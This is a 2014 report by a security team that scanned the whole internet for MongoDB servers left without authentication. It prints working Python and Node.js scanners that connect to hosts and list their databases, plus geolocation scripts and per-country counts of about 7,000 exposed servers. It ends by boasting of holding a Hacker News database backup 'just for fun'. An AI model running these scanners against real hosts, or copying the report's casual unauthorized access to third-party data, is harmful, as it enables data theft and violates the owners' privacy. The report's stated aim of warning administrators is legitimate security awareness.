### Mongodb unauthorized access vulnerability global probing report

	[+] Author: f1,2,3,4
	[+] Team: FF0000 Security Team <http://www.ff0000.cc>
	[+] From: HackerSoul <http://www.hackersoul.com>
	[+] Create: 2014-12-10
	
#### contents:
* Introduction
* Domain list
* Proof of Concept
* Scan results
* IP location
* Evil hackers

#### 0.Introduction

Mongodb suffered less types of attacks, So in vulnerability publishing platform, Many of Mongodb vulnerabilities are unauthorized access problem. Also there are nearly one hundred such cases on wooyun.org (just only part of data). So we want to know how much host that setup Mongodb in global was belong to unauthorized access, And then, We probing it:)

Ohhhhh, It's crazy!

>The cause of the unauthorized access: Mongodb provides many parameters at startup, Such as log path, Whether to open certification etc. The cause of unauthorized is when you start your mongodb service, You don't have set  **--auth** parameter. And very few of people will set database's username and password (The default is null password, Like a white paper, Needed administrator to draw it), Due to null password, Anybody can access your Mongodb database and login your data server.

#### 1.Domain list

First of all, How many are global use Mongodb? We search on [SHODAN](http://www.shodanhq.com/) and got 57736 numerical statistics, And then, We also search on [Zoomeye](http://www.zoomeye.org) got 53475 numerical statistics. Now we are in an embarrassing, Cause we can't get full of IP in SHODAN and Zoomeye. So we just use zmap to scan 1.1.1.1~255.255.255.255 , And probing mongodb port. Finally, We got nearly 40000 IP/Domain that use mongodb. It's a not big data, But  this is a difficult problem for us.

#### 2. Proof of Concept

The probing script we used [Mongodb unauth PoC](http://www.beebeeto.com/pdb/poc-2014-0194/) :

    #!/usr/bin/env python
    # coding=utf-8

    """
    Site: http://www.beebeeto.com/
    Framework: https://github.com/ff0000team/Beebeeto-framework
    """

    import pymongo
    import urllib2
    import urlparse

    from baseframe import BaseFrame


    class MyPoc(BaseFrame):
        poc_info = {
            # poc相关信息
            'poc': {
                'id': 'poc-2014-0194',
                'name': 'Mongodb 配置不当导致未授权访问漏洞 POC',
                'author': '1024',
                'create_date': '2014-12-10',
            },
            # 协议相关信息
            'protocol': {
                'name': 'http',
                'port': [28017],
                'layer3_protocol': ['tcp'],
            },
            # 漏洞相关信息
            'vul': {
                'app_name': 'Mongodb',
                'vul_version': ['*'],
                'type': 'Information Disclosure',
                'tag': ['Mongodb信息泄露漏洞', '默认空口令未授权访问漏洞', '27017/28017端口'],
                'desc': 'mongodb启动时未加 --auth选项，导致无需认证即可连接mongodb数据库，从而导致一系列安全问题。',
                'references': ['N/A',
                               ],
            },
        }


        @classmethod
        def verify(cls, args):
            verify_url = args['options']['target']
            ip_addr = urlparse.urlparse(verify_url).netloc
            if args['options']['verbose']:
                print '[*] Connect mongodb: ' + ip_addr + ':27017'
            try:
                conn = pymongo.MongoClient(ip_addr, 27017, socketTimeoutMS=3000)
                dbname = conn.database_names()
                if dbname:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = ip_addr + ':27017'
                    args['poc_ret']['database_names'] = dbname
            except Exception, e:
                print str(e)
                args['success'] = False
                return args
            return args

        exploit = verify


    if __name__ == '__main__':
        from pprint import pprint

        mp = MyPoc()
        pprint(mp.run())

When we ready to start scan it, F4 said he was completed PoC used Node.js and already start to probing：

    // Get url list
    var FilePath = "";
    var lineread = require("line-reader");
    var mongoose = require('mongoose');
    function conn(host,callback){
        var databaseUrl = 'mongodb://'+host;
        var options = { server: { socketOptions: { connectTimeoutMS: 4000 }}};
        var db = mongoose.createConnection(databaseUrl, options);
        db.on('error', function(error) {
            //console.log(error)
            db.close();
            return;
        });
        db.once('open',function(){
            callback(host);
        })
        db.close();
    }
    lineread.eachLine(FilePath, function(line) {
        if(String(line)){
            conn(line,function(callback){
                console.log("Success : "+callback);
            });
        }
    }).then(function () {
        console.log(FilePath+" Read Done!");
    });
    
>Remind: The reason of why we use zmap to filter IP, Instead use PoC to probing global, Cause use PoC to probing is slower.

#### 3. Scan results

The fact proved that use zmap to filter IP and then to probing mongodb server was meaningful. So we just used ten minminutes to completed scan. And the results make us shocked!

	[*] Start-date: 20141202-23:20
	[*] End-date: 20141202-23:28
	
	[*] Info
 	   [+] Target: 39818
 	   [+] Success: 7071
	
	[*] Done
	
In this results, We can found that has 7,071 number of authorized access vulnerability, The proportion as much as 17.7%.

#### 4. IP location

In this 39,818 IP, We had made duplicate removal, Removed 8,000 IP, Finally, We got last data: 31,126.

In order to be able to display results friendly, We used these IP for geographical position detection, The script:

    #!/usr/bin/env python
    # coding=utf8
    # author=f1#ff0000team

    import re
    import sys
    import json
    import requests

    reload(sys)
    sys.setdefaultencoding('utf-8')


    f_obj = open('./Port_27017','r')
    f_content = f_obj.readlines()
    for i in f_content:
        url = 'http://ip.taobao.com/service/getIpInfo.php?ip=%s' % i
        try:
            page_content = requests.get(url).text.encode('utf8')
        except:
            continue
        json_data = json.loads(page_content)
        ip = json_data['data']['ip'][:-1]
        country = json_data['data']['country']
        return_str = ip + ' --- ' + country + '\n'
        print return_str
        output = open('./port27017_aliip.txt', 'a+')
        output.write(return_str)
        output.close()
        
In order to count this data convenient, F2 has write a script to process it:

    #!/usr/bin/env python2
    # encoding:utf8
    # author:f2#ff0000team

    # 去重
    s = set()
    fo1 = open('./port27017_aliip_1.txt', 'wb')
    for eachLine in open('port27017_aliip.txt', 'rbU'):
        s.add(eachLine)
    fo1.writelines(s)

    # 统计
    d = {}
    for eachLine in s:
        ip, country = eachLine.strip().split('---')
        d[country] = d.get(country, 0) + 1
    fo2 = open('port27017_aliip_2.txt', 'wb')
    for x in sorted(d.iteritems(), key=lambda i: i[1], reverse=True):
        fo2.write(x[0]+'\t'+str(x[1])+'\n')
        
Finally, We got 31,126 IP and statistics by country:

* U.S: 13496
* Germany: 2513
* China: 1663
* Russia: 1317
* Netherlands: 1001
* UK: 732
* France: 449
* Romania: 360
* Canada: 316
* Korea: 288
* Norway: 271
* Japan: 256
* Sweden: 224
* Italy: 205
* Turkey: 200
* Other

And the host that has unauthorized access vulnerability statistics by country:

* U.S: 4184
* Germany: 499
* Netherlands: 228
* Russia: 211
* UK: 128
* China: 120
* France: 95
* Canada: 93
* Korea 60
* Other

The interesting thing is we can drawn in to a chart:

![chart](https://raw.githubusercontent.com/ff0000team/HackerSoul/master/img/mongodb_count_xj178du21g6dd8291s123.png)

#### 5. Evil hackers

Face to thousands of Mongodb server open to world. Some malicious attacker must be excited about it. Cause they can easily to access mongodb server and download many of database. We think there has many people want to do that, So our team want to this paper can let some DBA know about this risk. And to reduce this vulnerabilities.

Finally , We provided a Hacker News backup databases, Hope administrator will fix it, Just for fun:)

![hn](http://ww1.sinaimg.cn/mw1024/c334041bjw1end37e1ogqj21h00nek0g.jpg)